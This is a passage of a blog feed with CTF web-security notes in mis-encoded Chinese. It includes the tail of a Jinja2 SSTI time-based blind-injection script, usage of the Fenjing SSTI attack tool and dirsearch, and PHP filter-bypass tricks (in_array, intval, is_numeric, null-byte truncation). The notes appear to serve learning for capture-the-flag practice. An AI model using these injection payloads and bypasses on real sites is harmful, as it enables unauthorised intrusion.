class="number">66</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(\&quot;time\&quot;).sleep(4)&#x27;</span>)&#125;&#125;</span><span class="template-tag">&#123;%</span><span class="name">endif</span><span class="template-tag">%&#125;</span><span class="language-xml"><span class="tag">&quot; &#125;</span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response</span> = <span class="string">requests.post(url,</span> <span class="attr">data</span>=<span class="string">data)</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">end_time</span> = <span class="string">time.time()</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        # <span class="attr">è®¡ç®—å“åº”æ—¶é—´</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">response_time</span> = <span class="string">end_time</span> <span class="attr">-</span> <span class="attr">start_time</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">if</span> <span class="attr">response_time</span> &gt;</span>=2 and response_time&lt;=4:</span></span><br><span class="line"><span class="language-xml">            flag+=cs[index]</span></span><br><span class="line"><span class="language-xml">            print(cs[index],end=&#x27;\t&#x27;)</span></span><br><span class="line"><span class="language-xml">            low = high</span></span><br><span class="line"><span class="language-xml">        elif response_time&gt;4:</span></span><br><span class="line"><span class="language-xml">            low = index+1</span></span><br><span class="line"><span class="language-xml">        else:</span></span><br><span class="line"><span class="language-xml">            high = index</span></span><br><span class="line"><span class="language-xml">print(&quot;\n&quot;+flag)</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;äºŒåˆ†æ³•ç›´æ¥çˆ†ç ´flagã€‚</p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTIæ³¨å…¥</tag>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Wappalyzer</title>
    <url>/2024/07/24/Wappalyzer/</url>
    <content><![CDATA[<p>&emsp;&emsp;Wappalyzeræ˜¯ä¸€æ¬¾å¼€æºçš„æµè§ˆå™¨æ‰©å±•ï¼Œç”¨äºè¯†åˆ«ç½‘ç«™æ‰€ä½¿ç”¨çš„æŠ€æœ¯æ ˆã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å‡ºä½¿ç”¨çš„WebæœåŠ¡å™¨ã€å†…å®¹ç®¡ç†ç³»ç»Ÿã€ç¼–ç¨‹è¯­è¨€ã€JavaScriptåº“ã€æ¡†æ¶ç­‰ä¿¡æ¯ï¼Œå¹¶å°†å…¶å±•ç¤ºç»™ç”¨æˆ·ã€‚çŸ¥é“å¤§ä½“æ¡†æ¶åï¼Œèƒ½ä¸ºåé¢çš„æŸ¥æ‰¾å’Œæ€è·¯æä¾›ä¸€äº›æ–¹ä¾¿ï¼Œé—²ç€æ²¡äº‹çš„æ—¶å€™å°±å¯ä»¥ç‚¹ä¸€ä¸‹ï¼Œåˆæ²¡ä»€ä¹ˆå½±å“( Í¡Â°â¥ Í¡Â°)ã€‚ä¸‹è½½æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼ŒåŒhackbaråœ¨æ‰©å±•ä¸Šæœç´¢ä¸€ä¸‹å°±æ˜¯çš„å•¦ã€‚å®ç”¨æŒ‡æ•°:â­â­â­â­</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>eregi</title>
    <url>/2024/07/17/eregi/</url>
    <content><![CDATA[<p>&emsp;&emsp;eregi()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¸ƒå°”ç±»å‹ï¼Œå¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œeregi($pattern,$string),åœ¨$stringé‡Œé¢æœç´¢$patternã€‚</p>
<h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p>&emsp;&emsp;eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå³%00æˆªæ–­ï¼Œå¯ä»¥ä½¿ç”¨%00ç»•è¿‡éªŒè¯ï¼Œä¾‹å¦‚</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$a</span> = %00hello</span></span><br></pre></td></tr></table></figure>

<h3 id="æ•°ç»„è¿”å›å€¼"><a href="#æ•°ç»„è¿”å›å€¼" class="headerlink" title="æ•°ç»„è¿”å›å€¼"></a>æ•°ç»„è¿”å›å€¼</h3><p>&emsp;&emsp;ä¸å…¶ä»–ä¸åŒçš„æ˜¯ï¼Œè¯¥å‡½æ•°è‹¥å‚æ•°ä¸ºæ•°ç»„æ˜¯å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSEï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>fenjing</title>
    <url>/2024/06/05/fenjing/</url>
    <content><![CDATA[<h2 id="Fenjing-ç„šé–"><a href="#Fenjing-ç„šé–" class="headerlink" title="Fenjing(ç„šé–)"></a>Fenjing(ç„šé–)</h2><h3 id="fenjingä»‹ç»"><a href="#fenjingä»‹ç»" class="headerlink" title="fenjingä»‹ç»"></a>fenjingä»‹ç»</h3><p>&emsp;&emsp;ç„šé–æ˜¯ä¸€ä¸ªé’ˆå¯¹CTFæ¯”èµ›ä¸­Jinja2 SSTIç»•è¿‡WAFçš„å…¨è‡ªåŠ¨è„šæœ¬ï¼Œå¯ä»¥è‡ªåŠ¨æ”»å‡»ç»™å®šçš„ç½‘ç«™æˆ–æ¥å£ã€‚èƒ½è§£å†³å¸¸è§„æ€§çš„SSTIé¢˜ç›®ï¼Œå®ç”¨æŒ‡æ•°â­â­â­</p>
<h3 id="å®‰è£…æ–¹æ³•"><a href="#å®‰è£…æ–¹æ³•" class="headerlink" title="å®‰è£…æ–¹æ³•"></a>å®‰è£…æ–¹æ³•</h3><p>&emsp;&emsp;åœ¨windowsç¯å¢ƒä¸‹å®‰è£…æœ€æ–¹ä¾¿ï¼Œæœ¬äººå°è¯•åœ¨kaliå®‰è£…å¤±è´¥äº†å¾ˆå¤šæ¬¡ï¼Œå„ç§æŠ¥é”™ï¼Œæœ€åæ”¾å¼ƒäº†ã€‚&emsp;(ï¼›â€²âŒ’&#96;)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;è¯¥å‘½ä»¤æ‰§è¡Œå®Œæ¯•åä¼šåå¼¹ä¸€ä¸ªshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;ä¼šåœ¨æœ¬åœ°å¼¹å‡ºä¸€ä¸ªå¯è§†åŒ–æ“ä½œé¡µé¢ï¼Œç„¶ååœ¨æ ¹æ®è¦æ±‚å¡«å……å’Œæ‰§è¡Œï¼ˆæ–¹ä¾¿æ–°æ‰‹å»ä½¿ç”¨ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>

<p> &emsp;&emsp;ä¸€æŠŠæ¢­ï¼ˆè¯´å®è¯è¿˜æ˜¯ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤å¥½ç”¨äº›(ï¼_ï¼¼)å¤§æ€¨ç§ï¼‰</p>
<p> &emsp;æ›´ä¸ºè¯¦ç»†çš„åœ¨ <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>dirsearch</title>
    <url>/2024/07/23/dirsearch/</url>
    <content><![CDATA[<p>&emsp;&emsp;dirsearchç”¨æ¥æš´åŠ›æ‰«æä¸€äº›åŸºç¡€çš„å­˜åœ¨ç›®å½•å’Œæ–‡ä»¶ï¼Œå®ç”¨æŒ‡æ•°:â­â­â­â­,kaliå®‰è£…:</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/maurosoria/dirsearch.git</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å®‰è£…å®Œä¹‹åå°±æ˜¯å®‰è£…ä¾èµ–</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> dirsearch  <span class="string">//</span>è¿›å…¥dirsearchç›®å½•</span><br><span class="line"><span class="params">(sudo)</span> pip3 install -r requirements.txt <span class="string">//</span>å¯ä»¥tabè¡¥å…¨ï¼Œä¸èƒ½æ‰§è¡Œå°±ç”¨sudo</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ä¹‹åæ‰§è¡Œdirsearch.py</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch.py -h  <span class="comment">//æŸ¥çœ‹å¸®åŠ©</span></span><br><span class="line"><span class="comment">(sudo)</span> pytho<span class="symbol">n3</span> dirsearch -u URL <span class="comment">//æ‰«æå¼€å§‹</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;ä»¥ä¸Šå°±æ˜¯å¸¸è§„ç”¨æ³•ï¼ŒçŸ¥é“æ‰«æå°±è¡Œäº†ã€‚ï¼ˆåæœŸå¸®åŠ©ä¸å¤§ï¼‰</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>in_array</title>
    <url>/2024/07/13/in-array/</url>
    <content><![CDATA[<p>&emsp;&emsp;in_arrayå‡½æ•°çš„åŠŸèƒ½ç”¨äºæ£€æŸ¥æ•°ç»„æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼æˆ–è€…æ˜¯ä¸æ˜¯æ•°ç»„ã€‚å®šä¹‰ï¼šå¸ƒå°”å‹å‡½æ•°ï¼Œå‚æ•°ä¸ºï¼ˆ$needle,$haystack,[$strict &#x3D; FALSE]ï¼‰,åœ¨$haystackä¸­æœç´¢$needle,å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°$strictçš„å€¼ä¸ºTRUE(æ²¡æœ‰é»˜è®¤ä¸ºFALSE),åˆ™è¯¥å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼ˆç›¸ç­‰äº&#x3D;&#x3D;&#x3D;ï¼‰ï¼Œæ£€æŸ¥$needleçš„ç±»å‹æ˜¯å¦å’Œ$haystackä¸­çš„ç›¸åŒã€‚<font color=red>å¦‚æœæ‰¾åˆ°$haystackï¼Œåˆ™è¿”å›TRUE,å¦åˆ™è¿”å›FALSEã€‚</font></p>
<h3 id="in-arrayç¼ºé™·"><a href="#in-arrayç¼ºé™·" class="headerlink" title="in_arrayç¼ºé™·"></a>in_arrayç¼ºé™·</h3><p>&emsp;&emsp;æ ¹æ®ä¸Šé¢æ‰€æè¿°çš„ï¼Œå½“è¯¥å‡½æ•°æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°çš„æ—¶å€™ï¼Œåªä¼šè¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼ˆç›¸å½“äº&#x3D;&#x3D;ï¼‰ï¼Œä¹Ÿå°±æ˜¯ä¸ä¼šæ£€æŸ¥æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;æ ¹æ®ä¸Šé¢ç™½åå•è§„å®šï¼Œåªèƒ½ä¸Šä¼ 1~24çš„æ–‡ä»¶åï¼Œå› ä¸ºæ²¡æœ‰ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¿›è¡Œå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ 3shell.phpçš„æ—¶å€™ï¼Œåªè¦ç¬¬ä¸€ä¸ªåŒ¹é…å°±å¯ä»¥äº†ï¼Œä»è€Œç»•è¿‡äº†ç™½åå•ï¼Œè¾¾åˆ°äº†ä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ç›®çš„ã€‚ç±»ä¼¼çš„è¿˜æœ‰ï¼š  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¿™é‡Œæˆ‘ä»¬æœ‰æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼ŒåŒæ ·ç»•è¿‡äº†ç™½åå•ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯in_arrayçš„è¿”å›ç±»å‹ï¼ŒåŒ¹é…äº†è¿”å›ä»€ä¹ˆï¼Œè¿˜æœ‰æ³¨æ„å‰é¢çš„ï¼ï¼Œåœ¨preg_matchç­‰åŒ¹é…çš„æ—¶å€™æœ‰å¸¸å‡ºç°ï¼Œè¦çŸ¥é“å®ƒçš„ä½œç”¨ã€‚</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>hackbar</title>
    <url>/2024/07/13/hackbar/</url>
    <content><![CDATA[<p>&emsp;&emsp;hackbaræ˜¯ä¸€ä¸ªç”¨äºè°·æ­Œå’Œç«ç‹æµè§ˆå™¨çš„æ‰©å±•æ’ä»¶ï¼Œå¯ä»¥åœ¨æµè§ˆå™¨çš„æ‰©å±•ç›´æ¥ä¸‹è½½æ·»åŠ ï¼Œç„¶åæŒ‰F12å³å¯ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å’Œæ“ä½œå¯ä»¥åœ¨ç½‘ä¸Šæœä¸€æŠ“ä¸€å¤§æŠŠï¼Œ(å»ºè®®ä¸‹è½½cracked&amp;fixedç‰ˆæœ¬çš„ï¼Œæ–°ç‰ˆæœ¬å¥½åƒè¦æ¿€æ´»ç è¿˜æ˜¯ä»€ä¹ˆçš„)æˆ‘è¿™é‡Œåªåšä¸€ä¸ªæŒ‡è·¯å¼•å¯¼çš„ä½œç”¨ã€‚ï¼ˆï¼µãƒ»Ï‰ãƒ»ï¼‰âŠƒ<br>&emsp;&emsp; æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒè¿›è¡Œè‡ªå®šä¹‰å‘é€ï¼Œæ‰‹åŠ¨æ„é€ GET,POSTå’ŒCOOKIEç®¡ç†ç­‰æ–¹æ³•ï¼Œè¿˜å…·å¤‡æœ‰URLç¼–ç ï¼Œbase64ç¼–ç ï¼ŒMD5åŠ å¯† ç­‰çš„èƒ½åŠ›ï¼Œè¿˜æœ‰å¾ˆå¤šåŠŸèƒ½ç­‰ä½ æ…¢æ…¢æ²‰æ·€æŒ–æ˜ï¼Œå®ç”¨æŒ‡æ•°â­â­â­â­â­</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
        <tag>å·¥å…·|è„šæœ¬ åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>intval</title>
    <url>/2024/07/12/intval/</url>
    <content><![CDATA[<p>&emsp;&emsp;intval()å‡½æ•°ç”¨æ¥è·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œä½¿ç”¨çš„æ—¶å€™å¸¸è§çš„æœ‰ä¸¤ç§æƒ…å†µï¼š<br>&emsp;1.è½¬æ¢æ•´æ•°æ—¶ï¼Œè¿”å›æ•´æ•°æœ¬èº«<br>&emsp;2.è½¬æ¢å­—ç¬¦ä¸²æ—¶ï¼Œä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ï¼Œå¦‚æœå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯æ•´æ•°ï¼Œåˆ™è¿”å›0  </p>
<h3 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h3><p>&emsp;å¦‚æœå®ƒçš„å€¼ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œåªè¦æ•°ç»„é‡Œé¢æœ‰å€¼ï¼Œé‚£ä¹ˆä¸è®ºå€¼çš„æ•°é‡ï¼Œè¿”å›å€¼éƒ½ä¸º1ï¼Œç©ºæ•°ç»„åˆ™è¿”å›0  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;è¾“å‡º</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>

<h3 id="å­—ç¬¦ä¸²ç»•è¿‡"><a href="#å­—ç¬¦ä¸²ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²ç»•è¿‡"></a>å­—ç¬¦ä¸²ç»•è¿‡</h3><p>&emsp;&emsp;ç±»ä¼¼äºâ€™1000â€™,â€™2 or id &#x3D; 1000â€™çš„è¿™ç§å¸¦å•å¼•å·æˆ–è€…æœ‰å­—ç¬¦çš„ç±»å‹ï¼Œintval()å‡½æ•°ä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—çš„å­—ç¬¦ï¼Œä¾‹å¦‚ç¬¬äºŒä¸ªè½¬æ¢åˆ°orçš„æ—¶å€™ï¼Œç”±äºorä¸æ˜¯æ•°å­—ç±»å‹çš„å­—ç¬¦ï¼Œä»è€Œåœæ­¢è½¬æ¢ï¼Œè½¬æ¢çš„ç»“æœå°±åªæœ‰2ã€‚  </p>
<h3 id="å­—ç¬¦ä¸²ç±»å‹-è¿›åˆ¶ç»•è¿‡"><a href="#å­—ç¬¦ä¸²ç±»å‹-è¿›åˆ¶ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²ç±»å‹&amp;è¿›åˆ¶ç»•è¿‡"></a>å­—ç¬¦ä¸²ç±»å‹&amp;è¿›åˆ¶ç»•è¿‡</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="å­—ç¬¦ä¸²ç±»å‹&amp;è¿›åˆ¶ç»•è¿‡"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>is_numberic</title>
    <url>/2024/07/13/is-numberic/</url>
    <content><![CDATA[<p>&emsp;&emsp;is_numeric()å‡½æ•°ç”¨äºæ£€æŸ¥å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å±äºå¸ƒå°”ç±»å‹ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEï¼Œæ³¨æ„<font color=red>æµ®ç‚¹å‹è¿”å›ç©ºå€¼ï¼Œå³FALSEã€‚</font></p>
<h3 id="ç©ºå­—ç¬¦ç»•è¿‡"><a href="#ç©ºå­—ç¬¦ç»•è¿‡" class="headerlink" title="ç©ºå­—ç¬¦ç»•è¿‡"></a>ç©ºå­—ç¬¦ç»•è¿‡</h3><p>&emsp;&emsp;å¯ä»¥å€ŸåŠ©URLç¼–ç ä¸­çš„ç©ºå­—ç¬¦ï¼Œä¾‹å¦‚%00æˆ–è€…%20ï¼Œå…¶ä¸­%00åŠ åœ¨å‰é¢æˆ–è€…åé¢éƒ½å¯ä»¥ï¼Œä¹Ÿå°±æ˜¯%00404æˆ–è€…404%00ï¼Œè€Œ%20åªèƒ½æ”¾åœ¨æœ«å°¾ï¼Œæ¯”å¦‚404%20ï¼ˆ%20å‡†ç¡®æ¥è¯´æ˜¯ç©ºæ ¼å­—ç¬¦ï¼‰  </p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">æ•°å­—--&gt;éæ•°å­—ï¼š</span><br><span class="line">æ•°å€¼<span class="comment">%20</span></span><br><span class="line"><span class="comment">%00æ•°å€¼</span></span><br><span class="line">æ•°å€¼<span class="comment">%00</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;å½“ç„¶è¿˜å¯ä»¥è¿™æ ·æ„é€ :</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">num</span>=1&#x27;</span><br><span class="line">?<span class="attribute">num</span>=1,</span><br><span class="line">?<span class="attribute">num</span>=1%00</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;éƒ½å¯ä»¥ç»•è¿‡åˆ¤æ–­</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp; å…¶å®é¢˜ç›®çš„æ ¸å¿ƒæ˜¯å¼±æ¯”è¾ƒçš„ç‰¹æ€§ï¼Œæˆ‘ä»¬åªè¦çŸ¥é“è¿™ä¸ªå‡½æ•°çš„è¿”å›ç±»å‹å’Œä½œç”¨å°±è¿‡å…³äº†(ã£â—â€¸â—Ÿc)</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>å‡½æ•°ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>phpå…¥é—¨</title>
    <url>/2024/07/14/php%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>&emsp;&emsp;å¯¹äºåˆšæ¥è§¦webé¢˜çš„æ—¶å€™ï¼Œæœ€å…ˆæŒæ¡çš„è¯­è¨€åº”è¯¥æ˜¯phpï¼Œä¸è¯´æ‰€æœ‰çŸ¥è¯†ç‚¹è¦äº†è§£ï¼Œèµ·ç æ‰“webé¢˜çš„æ—¶å€™GETå’ŒPOSTæ–¹æ³•è¦ä¼šè¾¨åˆ«å’Œä½¿ç”¨ï¼Œæ¨èPHPå­¦ä¹ ç½‘ç«™  <a href="https://www.runoob.com/php">https://www.runoob.com/php</a><br>&emsp;&emsp;ç”Ÿæ€•ä½ ä»¬ä¸ä¼šç‚¹ï¼Œè¶…é“¾æ¥éƒ½æ²¡æœ‰å¼„(ã£â€™-â€˜)â•®&#x3D;ÍŸÍŸÍÍğŸ) ï¾ŸĞ´ï¾Ÿ ï¼‰</p>
<h3 id="GETæ–¹æ³•"><a href="#GETæ–¹æ³•" class="headerlink" title="GETæ–¹æ³•"></a>GETæ–¹æ³•</h3><p>&emsp;&emsp;ä¹Ÿæ˜¯ç”Ÿæ€•ä½ ä»¬ä¸çœ‹ï¼Œå•æ‹å‡ºæ¥ç»™ä½ ä»¬äº†è§£ä¸€ä¸‹ ( à©­ Ë™á—œË™ )à©­<br>&emsp;&emsp;GETæ–¹æ³•ï¼Œå—¯â€¦â€¦ä¸çŸ¥é“æ€ä¹ˆæè¿°ï¼Œç›´æ¥çœ‹ç¤ºä¾‹å°±çŸ¥é“äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&quot;&lt;BR&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;åƒæ˜¯$_GET[â€˜idâ€™]è¿™æ ·çš„ï¼Œé‡Œé¢çš„å‚æ•°å°±æ˜¯å˜é‡ï¼Œä»£è¡¨æœ‰ä¸ªå˜é‡idå¯ä»¥é€šè¿‡URL?çš„å½¢å¼è¿›è¡Œä¼ å‚ï¼Œä¾‹å¦‚<strong><a href="http://127.0.0.1/?id=1">http://127.0.0.1?id=1</a></strong>,è¿™æ ·idçš„å€¼å°±ä¸º1ã€‚</p>
<h3 id="POSTæ–¹æ³•"><a href="#POSTæ–¹æ³•" class="headerlink" title="POSTæ–¹æ³•"></a>POSTæ–¹æ³•</h3><p>&emsp;&emsp;å’ŒGETå·®ä¸å¤šï¼Œä½†ä¼ å‚çš„æ–¹å¼å˜äº†ï¼Œåƒæ˜¯ä½ åœ¨ç½‘é¡µè¾“å…¥çš„ä¿¡æ¯å°±æ˜¯ç”¨çš„POSTï¼Œå¦‚æœæ²¡æœ‰ä½ èƒ½ç‚¹çš„æˆ–è€…è¾“å…¥çš„ä¸œè¥¿ï¼Œå°±è¦ç”¨åˆ°hackbaräº†ï¼Œä»€ä¹ˆï¼Œä½ ä¸çŸ¥é“hackbaræ˜¯ä»€ä¹ˆï¼Ÿç‚¹è¿™ä¸ªäº†è§£ä¸€ä¸‹å§ï¼š<a href="/2024/07/13/hackbar/">hackbar</a></p>
<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>&emsp;&emsp; çŸ¥é“è¿™ä¸¤ä¸ªæ–¹æ³•ä¹‹åï¼Œæ­å–œä½ ï¼Œèƒ½åšå‡ºå¤§éƒ¨åˆ†çš„webé¢˜ç›®äº†ï¼Œé‡åˆ°ä¸ä¼šçš„å°±å»ç½‘ä¸Šæœå’Œé—®AIï¼Œwebä¸»è¦é å¾—æ˜¯ä½ çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›ï¼ŒåŠ æ²¹å§ï¼Œå¸ˆå‚…ä»¬ï½¸ï¾ï½¯!(à¹‘â€¢Ì€ã…‚â€¢Ì)Ùˆâœ§</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>md5</title>
    <url>/2024/06/11/md5/</url>
    <content><![CDATA[<p>&emsp;&emsp;MD5ç»•è¿‡æ˜¯webå…¥é—¨æŒæ¡çš„æœ€åŸºæœ¬çš„çŸ¥è¯†ç‚¹ï¼Œç»•è¿‡çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§</p>
